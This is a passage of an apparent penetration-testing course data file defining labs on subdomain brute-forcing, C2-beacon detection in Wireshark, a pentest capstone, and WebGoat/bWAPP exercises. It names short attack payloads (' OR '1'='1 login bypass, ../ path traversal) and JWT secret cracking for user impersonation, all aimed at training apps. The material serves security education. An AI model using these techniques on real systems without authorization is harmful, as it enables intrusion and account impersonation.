      "Wrote subbrute.py that resolves each candidate with socket.gethostbyname() before making any HTTP request",
      "Probed resolved candidates over HTTP and HTTPS, printing hostname, scheme, and status code for live results",
      "Parallelized the sweep with ThreadPoolExecutor against an authorized domain",
      "Cross-checked results against crt.sh and noted differences between active and passive enumeration",
    ],
    platform: "Python",
    difficulty: "medium",
    estimatedHours: 2,
    instructions: [
      `Create subbrute.py with argparse accepting --domain and --wordlist (default to a real SecLists file, not a hand-typed list)`,
      `Pull a real wordlist: clone SecLists or curl the raw file for Discovery/DNS/subdomains-top1million-5000.txt`,
      `For each word, build the candidate hostname f'{word}.{domain}'`,
      `Resolve DNS first with socket.gethostbyname(candidate) inside a try/except socket.gaierror block — this cheaply filters out the vast majority of non-existent subdomains before touching HTTP`,
      `For candidates that resolve, send requests.get(f'http://{candidate}', timeout=3) and an HTTPS variant (requests.get(..., verify=False)), catching requests.exceptions.RequestException`,
      `Print every subdomain that responds, along with its scheme (http/https) and status code`,
      `Parallelize with concurrent.futures.ThreadPoolExecutor (e.g. max_workers=30) since sequential DNS+HTTP checks over a 5,000-word list are too slow one at a time`,
      `Only run this against a domain you own/control or one you have explicit written authorization to test — stay in scope even for passive-feeling enumeration`,
      `Cross-check your results against a passive source for the same domain, crt.sh (certificate transparency), and note what your brute-forcer found that crt.sh didn't, and vice versa`,
    ],
    resources: [
      {
        title: "SecLists: Discovery/DNS wordlists",
        url: "https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS",
        type: "tool",
      },
      {
        title: "Python requests library docs",
        url: "https://requests.readthedocs.io",
        type: "link",
      },
      {
        title: "crt.sh certificate transparency search",
        url: "https://crt.sh",
        type: "tool",
      },
      {
        title: "Python socket module docs",
        url: "https://docs.python.org/3/library/socket.html",
        type: "link",
      },
    ],
    completionIndicator: `Terminal screenshot of subbrute.py's output listing discovered live subdomains (hostname, scheme, status code) for the test domain, next to the script's source code.`,
    slides: [
      {
        title: "Argparse + a real wordlist",
        body: "subbrute.py takes --domain and --wordlist, defaulting to a real SecLists file — Discovery/DNS/subdomains-top1million-5000.txt — rather than a hand-typed list.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command:
                "python3 subbrute.py --domain example.com --wordlist subdomains-top1million-5000.txt",
            },
          ],
        },
      },
      {
        title: "Build each candidate hostname",
        body: "For every word in the wordlist, the script builds a candidate hostname with f'{word}.{domain}' — e.g. 'admin.example.com' — before checking whether it actually exists.",
      },
      {
        title: "Resolve DNS before touching HTTP",
        body: "Each candidate is resolved first with socket.gethostbyname(candidate) inside a try/except socket.gaierror block — this cheaply filters out the vast majority of non-existent subdomains before any HTTP request is made.",
        diagram: {
          type: "terminal",
          prompt: ">>>",
          lines: [
            {
              command: "socket.gethostbyname('admin.example.com')",
            },
            {
              output: "203.0.113.20",
            },
            {
              command: "socket.gethostbyname('zzzqq.example.com')",
            },
            {
              output: "socket.gaierror: [Errno -2] Name or service not known",
            },
          ],
        },
      },
      {
        title: "Probe HTTP and HTTPS",
        body: "Candidates that resolve get requests.get(f'http://{candidate}', timeout=3) plus an HTTPS variant with verify=False, catching requests.exceptions.RequestException, then printing the hostname, scheme, and status code for every live response.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              output: "[+] http://admin.example.com  -> 200",
            },
            {
              output: "[+] https://admin.example.com -> 200",
            },
            {
              output: "[+] http://dev.example.com    -> 403",
            },
          ],
        },
      },
      {
        title: "Parallelize the checks",
        body: "Sequential DNS+HTTP checks over a 5,000-word list are too slow one at a time, so the whole per-word check is wrapped in concurrent.futures.ThreadPoolExecutor with max_workers=30.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command:
                "python3 subbrute.py --domain example.com --wordlist subdomains-top1million-5000.txt --threads 30",
            },
            {
              output: "Scanned 5000 candidates in 41.3s",
            },
          ],
        },
      },
      {
        title: "Stay in authorized scope",
        body: "This brute-forcer only ever runs against a domain you own/control or one you have explicit written authorization to test — stay in scope even for passive-feeling DNS enumeration.",
      },
      {
        title: "Cross-check against crt.sh",
        body: "Compare your brute-forcer's results against crt.sh's certificate-transparency search for the same domain, and note what your script found that crt.sh didn't, and vice versa.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command:
                "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u",
            },
            {
              output: "admin.example.com",
            },
            {
              output: "api.example.com",
            },
            {
              output: "vpn.example.com",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "You just reproduced the exact resolve-then-probe pattern that amass, subfinder, and every other subdomain enumeration tool run under the hood — and proved its blind spots by diffing against crt.sh's passive certificate-transparency data. That combination, active brute-forcing plus passive cross-referencing, is how real external recon actually maps a target's attack surface instead of trusting one source.",
      },
    ],
    hints: [
      "If your script wastes time sending HTTP requests to hosts that don't exist, check the order of your checks -- one step should cheaply filter candidates before the other ever runs.",
      "Resolve each candidate hostname with socket.gethostbyname() inside a try/except socket.gaierror block first; only candidates that resolve should move on.",
      "For candidates that resolve, probe with requests.get(f'http://{candidate}', timeout=3) and an HTTPS variant using verify=False, catching requests.exceptions.RequestException, then print the hostname, scheme, and status code.",
    ],
  },
  {
    id: "L37",
    number: 37,
    week: 12,
    moduleId: "m14",
    title: "Wireshark: identify the C2 beacon in a provided PCAP",
    description:
      "Real command-and-control traffic doesn't look like a Hollywood hacking scene — it looks like one HTTP GET hidden among a lot of ordinary-looking browser requests, distinguishable only by its suspiciously exact timing. This lab has you find that needle in a real, publicly-published malware PCAP from malware-traffic-analysis.net: sort Statistics > Conversations for an outlier destination, confirm the heartbeat in the IO Graph, follow the TCP/TLS stream for payload and user-agent artifacts, then time the exact beacon interval and cross-reference the destination against abuse.ch URLhaus threat intel. You close by writing up the finding the way a SOC analyst would — destination, interval, signature, and a concrete Zeek/Suricata detection rule for the exact pattern. You leave able to spot a beacon buried in real traffic and turn it into an actionable detection, not just a diagnosis.",
    objective:
      "Identify a command-and-control beacon hidden in a real malware PCAP using Wireshark's Conversations and IO Graph, and turn the finding into a detection rule.",
    successCriteria: [
      "Identified the outlier destination IP via Statistics > Conversations",
      "Confirmed the periodic beacon pattern in the IO Graph",
      "Computed the exact beacon interval and cross-referenced the destination against abuse.ch URLhaus",
      "Wrote up the destination, interval, C2 signature, and a Zeek/Suricata detection rule",
    ],
    platform: "Wireshark",
    difficulty: "medium",
    estimatedHours: 2,
    instructions: [
      `Go to malware-traffic-analysis.net's training-exercises page and pick one exercise whose task description explicitly asks you to identify a C2/beacon destination and interval`,
      `Download the exercise zip and unzip it with the password given on that exercise's own page (the site's standard convention is an 'infected'-based password, but always confirm the current one on the page — it can vary by exercise)`,
      `Open the .pcap in Wireshark, then check Statistics -> Conversations (TCP/UDP tabs), sorting by packet count/duration to spot one destination IP with unusually frequent, evenly-spaced connections`,
      `Check Statistics -> IO Graph with a 1-10 second interval and look for a flat, repeating spike pattern — that periodic 'heartbeat' shape is the signature of a beacon versus organic human browsing`,
      `Right-click a packet to/from the suspect IP -> Follow -> HTTP Stream or TLS Stream to inspect payload, user-agent, URI pattern, or certificate/SNI details for identifiable C2 artifacts`,
      `Filter on just that IP (ip.addr == x.x.x.x) and use the Conversations 'Duration' and packet-count columns to compute the beacon interval between successive connections`,
      `Cross-reference the destination IP/domain against a threat-intel source such as abuse.ch URLhaus to confirm it's documented malicious infrastructure`,
      `Optional depth: complete TryHackMe's Zeek and Brim rooms first if the traffic-analysis fundamentals feel shaky, then repeat the same pcap using Zeek logs/Brim for a log-based view of the same beacon`,
      `Write up: beacon destination IP/domain, interval, protocol/port, any identifiable C2 signature, and how you'd write a Zeek/Suricata detection rule for this exact pattern`,
    ],
    resources: [
      {
        title: "malware-traffic-analysis.net: training exercises",
        url: "https://www.malware-traffic-analysis.net/training-exercises.html",
        type: "tool",
      },
      { title: "Wireshark", url: "https://www.wireshark.org", type: "tool" },
      {
        title: "TryHackMe: Network Monitoring with Zeek",
        url: "https://tryhackme.com/room/networkmonitoringwithzeek",
        type: "platform",
      },
      {
        title: "TryHackMe: Brim",
        url: "https://tryhackme.com/room/brim",
        type: "platform",
      },
      {
        title: "abuse.ch URLhaus",
        url: "https://urlhaus.abuse.ch",
        type: "link",
      },
    ],
    completionIndicator: `Wireshark screenshot showing the IO Graph's periodic beacon spikes plus the Conversations table row for the suspect IP, annotated in your write-up with the computed beacon interval and destination IP/domain.`,
    slides: [
      {
        title: "Pick a real malware PCAP",
        body: "malware-traffic-analysis.net's training-exercises page lists real PCAPs; pick one whose task explicitly asks you to identify a C2/beacon destination and interval, then download the zip and unzip it with the password given on that exercise's own page.",
        diagram: {
          type: "browser-mockup",
          url: "malware-traffic-analysis.net/training-exercises.html",
          annotations: [
            {
              label: "Exercise task",
              note: "identify the C2/beacon destination and interval",
            },
            {
              label: "ZIP password",
              note: "confirm the current one on the exercise's own page",
            },
          ],
        },
      },
      {
        title: "Sort Conversations for outliers",
        body: "Statistics -> Conversations (TCP/UDP tabs), sorted by packet count/duration, surfaces one destination IP with unusually frequent, evenly-spaced connections against otherwise normal-looking browsing traffic.",
        diagram: {
          type: "packet-capture",
          rows: [
            {
              time: "0.000",
              source: "10.1.1.50",
              dest: "203.0.113.10",
              protocol: "TCP",
              info: "SYN 443 (normal browsing)",
            },
            {
              time: "0.045",
              source: "10.1.1.50",
              dest: "93.184.216.34",
              protocol: "TLS",
              info: "Client Hello (normal browsing)",
            },
            {
              time: "60.001",
              source: "10.1.1.50",
              dest: "203.0.113.55",
              protocol: "HTTP",
              info: "GET /update.php",
              highlighted: true,
            },
            {
              time: "120.003",
              source: "10.1.1.50",
              dest: "203.0.113.55",
              protocol: "HTTP",
              info: "GET /update.php",
              highlighted: true,
            },
            {
              time: "180.002",
              source: "10.1.1.50",
              dest: "203.0.113.55",
              protocol: "HTTP",
              info: "GET /update.php",
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "Confirm the heartbeat in IO Graph",
        body: "Statistics -> IO Graph set to a 1-10 second interval turns the suspicious host's traffic into a flat, repeating spike pattern — that periodic heartbeat shape is what separates a C2 beacon from organic human browsing.",
        diagram: {
          type: "packet-capture",
          rows: [
            {
              time: "00:01:00",
              source: "10.1.1.50",
              dest: "203.0.113.55",
              protocol: "HTTP",
              info: "GET /update.php (interval 60s)",
              highlighted: true,
            },
            {
              time: "00:02:00",
              source: "10.1.1.50",
              dest: "203.0.113.55",
              protocol: "HTTP",
              info: "GET /update.php (interval 60s)",
              highlighted: true,
            },
            {
              time: "00:03:00",
              source: "10.1.1.50",
              dest: "203.0.113.55",
              protocol: "HTTP",
              info: "GET /update.php (interval 60s)",
              highlighted: true,
            },
            {
              time: "00:04:00",
              source: "10.1.1.50",
              dest: "203.0.113.55",
              protocol: "HTTP",
              info: "GET /update.php (interval 60s)",
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "Follow the stream for payload artifacts",
        body: "Right-click a packet to/from the suspect IP -> Follow -> HTTP Stream or TLS Stream to expose the payload, user-agent, URI pattern, or certificate/SNI details that make the C2 traffic identifiable.",
        diagram: {
          type: "request-response",
          leftLabel: "Infected host 10.1.1.50",
          rightLabel: "203.0.113.55",
          exchanges: [
            {
              direction: "right",
              label: "GET /update.php",
              payload: "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0)",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "base64-encoded blob in response body",
            },
          ],
        },
      },
      {
        title: "Time the beacon, then check threat intel",
        body: "Filtering on ip.addr == the suspect IP and reading the Conversations table's Duration and packet-count columns gives the exact interval between beacon connections; cross-referencing that IP/domain against abuse.ch URLhaus confirms it's documented malicious infrastructure.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "victim",
              label: "Infected host 10.1.1.50",
              kind: "victim",
            },
            {
              id: "c2",
              label: "203.0.113.55",
              kind: "server",
            },
            {
              id: "intel",
              label: "abuse.ch URLhaus",
              kind: "device",
            },
          ],
          edges: [
            {
              from: "victim",
              to: "c2",
              label: "beacon every 60s",
            },
            {
              from: "c2",
              to: "intel",
              label: "IP/domain lookup",
              dashed: true,
            },
          ],
        },
      },
      {
        title: "Write up the detection",
        body: "The write-up covers the beacon's destination IP/domain, interval, protocol/port, and any identifiable C2 signature, plus how you'd turn this exact pattern into a Zeek or Suricata detection rule — optionally after repeating the same PCAP in Zeek/Brim if the fundamentals felt shaky.",
      },
      {
        title: "Why this matters",
        body: "The skill you just used — spotting a periodic heartbeat buried in normal-looking traffic via Conversations and IO Graph, then confirming it against threat intel — is exactly how SOC analysts and incident responders detect live malware infections through their network behavior rather than a file signature. Turning that finding into a Zeek/Suricata rule is what separates a one-off catch from a detection that protects the network going forward.",
      },
    ],
    hints: [
      "Not sure where to look in the pcap? Open Statistics -> Conversations and sort by packet count or duration -- one destination IP should stand out against otherwise normal browsing traffic.",
      "Confirm it's really a beacon (not just a busy host) by checking Statistics -> IO Graph with a 1-10 second interval -- a flat, repeating spike pattern is the signature of a beacon versus organic browsing.",
      "Filter on ip.addr == the suspect IP and read the Duration/packet-count columns in Conversations to compute the exact interval between connections, then Follow -> HTTP Stream or TLS Stream on one of those packets for the payload or user-agent artifacts.",
    ],
  },
  {
    id: "L38",
    number: 38,
    week: 12,
    moduleId: "m15",
    title: "CAPSTONE: 48-hour pentest simulation",
    description:
      "Client engagements run on a signed Rules of Engagement and a hard deadline — the shell you land partway through exploitation is worthless to the client if it never turns into a CVSS-scored, remediation-ready report by hour 48. This capstone puts you through that exact constraint: recon, automated and manually-verified vulnerability analysis, exploitation to a confirmed foothold, privilege escalation, and a full PTES-structured report (Executive Summary, Scope, Methodology, Findings, Risk Rating, Recommendations) — all against a real, legally-scoped target in a fixed 48-hour window. Every prior week's skill — from HTB methodology to hash cracking to traffic analysis — gets folded into one continuous engagement instead of an isolated exercise. You walk away having produced the actual deliverable a client pays for: a complete, professional pentest report built under real-world time pressure.",
    objective:
      "Run a complete, time-boxed 48-hour penetration test against a legally scoped target and deliver a professional, PTES-structured report.",
    successCriteria: [
      "Completed recon, vulnerability analysis, exploitation to a foothold, and privilege escalation within the allotted hour-blocks",
      "Logged commands, evidence, and a CVSS score for each finding",
      "Produced a report with Executive Summary, Scope, Methodology, Findings, Risk Rating, and Recommendations",
      "Delivered the final report with foothold and privesc proof (e.g. id/whoami showing elevated access)",
    ],
    platform: "Full Pentest",
    difficulty: "hard",
    estimatedHours: 16,
    instructions: [
      `Hour 0: get your assigned target and written Rules of Engagement (scope, IP/domain allow-list, testing window, emergency contact). If self-directed, assign yourself a real, legal target — e.g. an HTB Starting Point machine or a locally-hosted Metasploitable2/DVWA stack — and write your own one-page ROE before touching it`,
      `Hours 0-4 (Recon): passive OSINT (WHOIS, Shodan, crt.sh, Google dorking) plus active discovery (nmap -sV -p- against every in-scope host); log every command and its raw output as you go`,
      `Hours 4-10 (Vulnerability analysis): run an automated scanner (Nessus Essentials or OpenVAS/Greenbone) against discovered services, then manually verify at least your top 5 findings aren't false positives`,
      `Hours 10-24 (Exploitation): attempt to exploit at least one confirmed vulnerability to establish a foothold, screenshotting/logging each step (command, response, resulting access level)`,
      `Hours 24-32 (Post-exploitation/privesc): enumerate for privilege escalation (SUID binaries, misconfigured services, credential reuse), cross-checking any binary-based technique against GTFOBins, and document the full path to higher privilege`,
      `Hours 32-36 (Impact, only if explicitly in scope): note any additional hosts/data reachable from the foothold without exceeding the agreed ROE`,
      `Hours 36-44 (Reporting): assign a CVSS score to every finding and write the report with a standard structure — Executive Summary, Scope, Methodology, Detailed Findings (CVSS + evidence + remediation), Overall Risk Rating, Strategic Recommendations`,
      `Hours 44-48 (QA + delivery): proofread the Executive Summary for a non-technical reader, confirm every finding has reproduction steps and a fix, then submit the final report as the programme's closing deliverable`,
      `Start from a real report skeleton rather than a blank page — professional pentest reports follow near-identical section ordering across the industry (see resources)`,
    ],
    resources: [
      {
        title:
          "PTES Technical Guidelines (maintained mirror; pentest-standard.org is currently unreachable)",
        url: "https://pentest-standard.readthedocs.io/en/latest/",
        type: "link",
      },
      {
        title: "OWASP Web Security Testing Guide",
        url: "https://owasp.org/www-project-web-security-testing-guide/",
        type: "link",
      },
      {
        title: "TCM Security: sample pentest report",
        url: "https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report",
        type: "link",
      },
      {
        title: "Nessus Essentials (free)",
        url: "https://www.tenable.com/products/nessus/nessus-essentials",
        type: "tool",
      },
      {
        title: "Hack The Box – Starting Point (self-directed target option)",
        url: "https://app.hackthebox.com/starting-point",
        type: "platform",
      },
    ],
    completionIndicator: `Final PDF/Markdown pentest report containing Executive Summary, Scope, Methodology, Detailed Findings with CVSS scores and evidence screenshots, and Remediation/Strategic Recommendations — plus a screenshot of the initial foothold and privesc proof (e.g. id/whoami showing root/admin) referenced in the findings.`,
    slides: [
      {
        title: "Hour 0: scope and ROE",
        body: "Before touching anything, get your assigned target and written Rules of Engagement — scope, IP/domain allow-list, testing window, emergency contact. If self-directed, assign yourself a real, legal target (an HTB Starting Point machine or a local Metasploitable2/DVWA stack) and write your own one-page ROE first.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "ROE",
              detail: "Hour 0",
            },
            {
              label: "Recon",
              detail: "Hours 0-4",
            },
            {
              label: "Vuln Analysis",
              detail: "Hours 4-10",
            },
            {
              label: "Exploitation",
              detail: "Hours 10-24",
            },
            {
              label: "Post-Exploitation",
              detail: "Hours 24-32",
            },
            {
              label: "Reporting",
              detail: "Hours 36-44",
            },
            {
              label: "QA + Delivery",
              detail: "Hours 44-48",
            },
          ],
        },
      },
      {
        title: "Hours 0-4: Recon",
        body: "Passive OSINT (WHOIS, Shodan, crt.sh, Google dorking) plus active discovery (nmap -sV -p- against every in-scope host), logging every command and its raw output as you go.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Passive OSINT",
              detail: "WHOIS, Shodan, crt.sh, dorking",
            },
            {
              label: "Active discovery",
              detail: "nmap -sV -p-",
            },
            {
              label: "Log everything",
              detail: "command + raw output",
            },
          ],
        },
      },
      {
        title: "Hours 4-10: Vulnerability analysis",
        body: "Run an automated scanner (Nessus Essentials or OpenVAS/Greenbone) against discovered services, then manually verify at least your top 5 findings aren't false positives.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Automated scan",
              detail: "Nessus Essentials / OpenVAS",
            },
            {
              label: "Manual verification",
              detail: "top 5 findings, rule out false positives",
            },
          ],
        },
      },
      {
        title: "Hours 10-24: Exploitation",
        body: "Attempt to exploit at least one confirmed vulnerability to establish a foothold, screenshotting/logging each step — command, response, and resulting access level.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Select confirmed vuln",
            },
            {
              label: "Exploit",
              detail: "establish foothold",
            },
            {
              label: "Log evidence",
              detail: "command, response, access level",
            },
          ],
        },
      },
      {
        title: "Hours 24-36: Post-exploitation and impact",
        body: "Enumerate for privilege escalation (SUID binaries, misconfigured services, credential reuse), cross-checking any binary-based technique against GTFOBins and documenting the full path to higher privilege; only if explicitly in scope, note any additional hosts/data reachable from the foothold without exceeding the agreed ROE.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Privesc enum",
              detail: "SUID, misconfig, cred reuse",
            },
            {
              label: "GTFOBins cross-check",
            },
            {
              label: "Impact (if in scope)",
              detail: "Hours 32-36",
            },
          ],
        },
      },
      {
        title: "Hours 36-44: Reporting",
        body: "Assign a CVSS score to every finding and write the report with the standard structure: Executive Summary, Scope, Methodology, Detailed Findings (CVSS + evidence + remediation), Overall Risk Rating, and Strategic Recommendations.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "CVSS score",
              detail: "every finding",
            },
            {
              label: "Report structure",
              detail:
                "Exec Summary -> Scope -> Methodology -> Findings -> Risk Rating -> Recommendations",
            },
          ],
        },
      },
      {
        title: "Hours 44-48: QA and delivery",
        body: "Proofread the Executive Summary for a non-technical reader, confirm every finding has reproduction steps and a fix, then submit the final report as the programme's closing deliverable — starting from a real report skeleton rather than a blank page.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Proofread exec summary",
            },
            {
              label: "Verify repro steps + fixes",
            },
            {
              label: "Submit final report",
            },
          ],
        },
      },
      {
        title: "What you just proved",
        body: "You just ran the complete lifecycle real engagements are billed on — scoped recon through exploitation, privesc, and a CVSS-scored report — inside the same time pressure clients actually impose. That's the difference this programme was building toward: not the ability to get a shell, but the ability to turn a shell into a report a client can act on, on deadline.",
      },
    ],
    hints: [
      "Not sure what to do next? Check which hour-block phase you're in -- ROE, Recon, Vulnerability Analysis, Exploitation, Post-Exploitation, or Reporting -- each has its own specific tasks and deadline.",
      "Stuck in vulnerability analysis? Remember the two-step: run an automated scanner (Nessus Essentials or OpenVAS/Greenbone) first, then manually verify your top 5 findings aren't false positives before moving to exploitation.",
      "If the report feels overwhelming, don't start from a blank page -- start from a real report skeleton (see the TCM Security sample report) and fill in the standard sections: Executive Summary, Scope, Methodology, Detailed Findings with CVSS scores and evidence, Overall Risk Rating, Strategic Recommendations.",
    ],
  },
  {
    id: "L39",
    number: 39,
    week: 9,
    moduleId: "m9",
    title: "WebGoat: SQL Injection & Path Traversal",
    description:
      "WebGoat is OWASP's own official training platform, and its Injection Flaws lessons are the same drills used to teach SQL injection and path traversal before a developer ever touches a real codebase. You register your own account inside WebGoat itself — no shared credentials, no external platform — then work through the SQL Injection lesson set, from spotting a raw string-concatenated query to bypassing a login with a classic ' OR '1'='1 payload, before moving to the Path Traversal lesson, where an unsanitized filename parameter lets you walk out of an intended directory using ../ sequences. Because WebGoat only unlocks a green checkmark once you've supplied the actual working payload, not just read the answer, you leave with the muscle memory for spotting and exploiting both flaw classes in a real codebase.",
    objective:
      "Complete WebGoat's SQL Injection and Path Traversal lessons by supplying working exploit payloads for each vulnerability type.",
    successCriteria: [
      "Solved the String and Numeric SQL Injection exercises with payloads that return unintended rows",
      "Bypassed a login form using a ' OR '1'='1 style tautology payload",
      "Escalated the Path Traversal lesson's filename parameter with ../ sequences to read a file outside the intended directory",
      "WebGoat's lesson tracker shows a green 'Solved' indicator on all completed exercises",
    ],
    platform: "WebGoat",
    difficulty: "medium",
    estimatedHours: 3,
    completionIndicator:
      "WebGoat's own lesson tracker showing a green 'Solved' indicator on the String SQL Injection, Numeric SQL Injection, and Path Traversal exercises.",
    dockerImage: "webgoat/webgoat",
    containerPort: 8080,
    instructions: [
      `Click 'Start Lab' above to launch WebGoat in Docker, then browse to http://localhost:18080/WebGoat -- the bare root returns nothing, WebGoat lives under the /WebGoat path`,
      `Register your own account directly inside WebGoat (Sign up link) -- no external platform or shared credentials needed`,
      `Open the 'Injection Flaws' lesson category from the left menu and work through the SQL Injection subsection in order`,
      `Complete the 'String SQL Injection' exercise by supplying a payload that returns rows the query wasn't meant to return`,
      `Complete the 'Numeric SQL Injection' and 'Log Spoofing' exercises in the same subsection`,
      `Bypass a login form using a classic ' OR '1'='1 style payload in the dedicated login-bypass exercise`,
      `Move to the 'Path Traversal' lesson, identify the vulnerable filename parameter, and escalate with ../ sequences until you read a file outside the intended directory`,
      `Screenshot each lesson's green 'Solved' indicator as you complete it`,
    ],
    resources: [
      {
        title: "WebGoat (GitHub)",
        url: "https://github.com/WebGoat/WebGoat",
        type: "tool",
      },
      {
        title: "OWASP WebGoat project page",
        url: "https://owasp.org/www-project-webgoat/",
        type: "link",
      },
      {
        title: "OWASP SQL Injection Prevention Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        type: "link",
      },
      {
        title: "OWASP Path Traversal",
        url: "https://owasp.org/www-community/attacks/Path_Traversal",
        type: "link",
      },
    ],
    slides: [
      {
        title: "Register your own WebGoat account",
        body: "WebGoat runs entirely locally with no shared credentials — click Start Lab, browse to /WebGoat (not the bare root), and register your own account before opening any lesson.",
      },
      {
        title: "String & numeric SQL injection",
        body: "Work through the SQL Injection subsection: solve the String SQL Injection exercise with a payload that returns rows the query wasn't meant to, then the Numeric SQL Injection and Log Spoofing exercises.",
      },
      {
        title: "Bypass a login with ' OR '1'='1",
        body: "The dedicated login-bypass exercise wants a classic tautology payload in the username or password field — the same technique that works against any string-concatenated login query.",
      },
      {
        title: "Path Traversal: walk out of the directory",
        body: "Switch to the Path Traversal lesson, find the vulnerable filename parameter, and escalate with ../ sequences until you read a file outside the directory the app intended.",
      },
      {
        title: "Why this matters",
        body: "WebGoat only marks a lesson solved once your own payload actually works end to end — that's the same bar a real codebase holds you to, not a multiple-choice answer.",
      },
    ],
    hints: [
      "Can't find the lessons? They're under 'Injection Flaws' in the left menu, in the SQL Injection subsection -- work through them in order starting with String SQL Injection.",
      "For String SQL Injection, think about what happens if you close the existing query's string early and add your own condition, so the query returns rows it was never meant to.",
      "The login-bypass exercise wants a classic tautology in the username or password field shaped like ' OR '1'='1; for Path Traversal, escalate the vulnerable filename parameter with ../ sequences until you land outside the intended directory.",
    ],
  },
  {
    id: "L40",
    number: 40,
    week: 11,
    moduleId: "m11",
    title: "WebGoat: Broken Access Control & JWT",
    description:
      "Once an application starts trusting a token instead of a session cookie, every JWT-handling mistake becomes a direct path to impersonating another user -- WebGoat's JSON Web Token lessons walk through exactly that failure mode. You'll exploit a JWT signed with a weak, guessable secret by brute-forcing it offline, then forge a token claiming to be a different user and use it to reach data that user's role shouldn't expose. The lab pairs this with WebGoat's Broken Access Control lessons, where a purely client-side authorization check and an insecure direct object reference both let you reach another user's data by editing a request the server should have validated itself. You leave able to name the exact missing server-side check behind both bugs.",
    objective:
      "Exploit weak JWT signing and broken access control flaws in WebGoat by cracking a JWT secret to forge tokens and bypassing both server- and client-side authorization checks.",
    successCriteria: [
      "Brute-forced the weak JWT signing secret and used it to forge a token for a different user",
      "Accessed a protected endpoint using the forged token",
      "Exploited an Insecure Direct Object Reference by changing a request parameter to view another user's data",
      "Bypassed a client-side-only filtering check and named the missing server-side control for each exercise",
    ],
    platform: "WebGoat",
    difficulty: "medium",
    estimatedHours: 3,
    completionIndicator:
      "WebGoat's lesson tracker showing green 'Solved' on the JWT secret-cracking exercise, the Insecure Direct Object References exercise, and the Client-Side Filtering exercise.",
    dockerImage: "webgoat/webgoat",
    containerPort: 8080,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/WebGoat/login and log in with the account from the SQL Injection lab (or register a new one)`,
      `Open the 'JSON Web Tokens' lesson category and identify why the exercise's provided token's signing secret is crackable offline`,
      `Brute-force the weak JWT signing secret with a wordlist and a tool such as hashcat or jwt_tool, then use the recovered secret to forge a token for a different user`,
      `Use the forged token to access the exercise's protected endpoint as that other user`,
      `Open the 'Insecure Direct Object References' lesson and change a request parameter (e.g. a numeric ID) to view another user's data the server should have blocked`,
      `Open the 'Client-Side Filtering' exercise inside Broken Access Control and bypass a check that only exists in the browser, never on the server`,
      `For each exercise, write one sentence naming the exact server-side check that was missing`,
    ],
    resources: [
      {
        title: "WebGoat (GitHub)",
        url: "https://github.com/WebGoat/WebGoat",
        type: "tool",
      },
      { title: "jwt.io — JWT decoder", url: "https://jwt.io", type: "tool" },
      {
        title: "jwt_tool (GitHub)",
        url: "https://github.com/ticarpi/jwt_tool",
        type: "tool",
      },
      {
        title: "OWASP Broken Access Control",
        url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
        type: "link",
      },
      {
        title: "OWASP JWT Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
        type: "link",
      },
    ],
    slides: [
      {
        title: "Crack a weak JWT signing secret",
        body: "Log into WebGoat, open JSON Web Tokens, and identify why the exercise's token secret is weak enough to brute-force offline with a wordlist and a tool like hashcat or jwt_tool.",
      },
      {
        title: "Forge a token, become another user",
        body: "Once you recover the signing secret, forge a new token claiming a different user identity and use it against the exercise's protected endpoint.",
      },
      {
        title: "Insecure Direct Object References",
        body: "Change a numeric ID in a request to pull another user's data — the server should have checked that the ID belonged to the logged-in user, and didn't.",
      },
      {
        title: "Client-side-only filtering",
        body: "The Client-Side Filtering exercise enforces a rule only in the browser's JavaScript — bypass it by sending the request directly instead of through the UI.",
      },
      {
        title: "Why this matters",
        body: "All three findings share one root cause: the server trusted something — a signature, an ID, a UI restriction — that only the client had actually checked.",
      },
    ],
    hints: [
      "Stuck on the JWT exercise? Start by asking why the exercise's provided token would have a signing secret that's crackable offline at all -- that's the flaw the lesson wants you to find.",
      "Brute-force the weak JWT signing secret with a wordlist using a tool like hashcat or jwt_tool; once you recover it, you can sign your own token claiming a different user's identity.",
      "For Insecure Direct Object References, just change the numeric ID in the request to another value; for Client-Side Filtering, the restriction only exists in the browser's JavaScript, so send the request directly instead of going through the UI.",
    ],
  },
  {
    id: "L41",
    number: 41,
    week: 9,
    moduleId: "m9",
    title: "bWAPP: same bug, two filter strengths",
    description:
      "bWAPP deliberately bundles over 100 web vulnerabilities behind one login screen, categorized by OWASP class, so you can drill a specific vuln type on demand instead of hunting for the right target. After the one-time install step every fresh bWAPP deployment needs, you'll use its own security-level slider (low/medium/high) across three categories -- SQL Injection, Stored XSS, and OS Command Injection -- first solving each at 'low' to confirm the mechanic, then re-attempting the exact same bug at 'medium' to see what a real, partial input filter actually blocks and what it misses. That comparison, same bug, same payload family, different filter strength, is what separates 'I found XSS once' from understanding why a filter catches one variant and not another.",
    objective:
      "Exploit the same three vulnerability classes on bWAPP at security level 'low', then repeat each at 'medium' to see what a real partial filter blocks and what it misses.",
    successCriteria: [
      "Extract data with a UNION-based SQL injection payload at level low, then re-run it at level medium",
      "Solve the stored XSS (Blog) challenge at level low, then repeat at level medium",
      "Solve the OS command injection challenge at level low, then repeat at level medium",
      "For each of the three categories, note what the medium filter blocked and whether a bypass was found",
